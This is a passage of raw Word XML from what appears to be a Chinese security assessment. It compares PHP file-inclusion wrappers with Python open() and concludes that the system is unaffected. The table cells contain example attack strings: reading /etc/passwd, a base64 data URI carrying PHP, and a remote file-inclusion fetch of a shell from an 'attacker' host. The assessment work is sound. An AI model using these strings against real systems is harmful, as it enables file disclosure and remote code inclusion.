                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">Python </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>本系统是否受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>分析</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>file://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open("file:///etc/passwd")</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 在 Python 中会尝试打开名为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>file:///etc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 的文件，不存在则报错</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>data://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open("data://text/plain;base64,PD9waHA...")</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> Python 不识别 data URI scheme</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>php://filter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>php://</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 为 PHP 内置协议包装器，Python 无对应实现</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>http://</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>https://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持（RFI）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open("http://attacker/shell.txt")</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> Python 抛出 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>FileNotFoundError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ftp://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">Python </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 不支持 FTP 协议</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>expect://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>仅 PHP expect 扩展支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>zip://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>zip://archive.zip#file.txt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> Python 不识别</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>phar://</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不支持</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不受影响</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>PHP 特有的 Phar 协议</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.2 Python 环境下等效攻击面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">虽然 Python </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>open()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不直接支持伪协议，但攻击者在 Python 环境中可通过以下方式实现等效效果：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实现原理</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>是否需要伪协议</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>本系统是否可行</w:t>
            </w:r>
          </w:p>
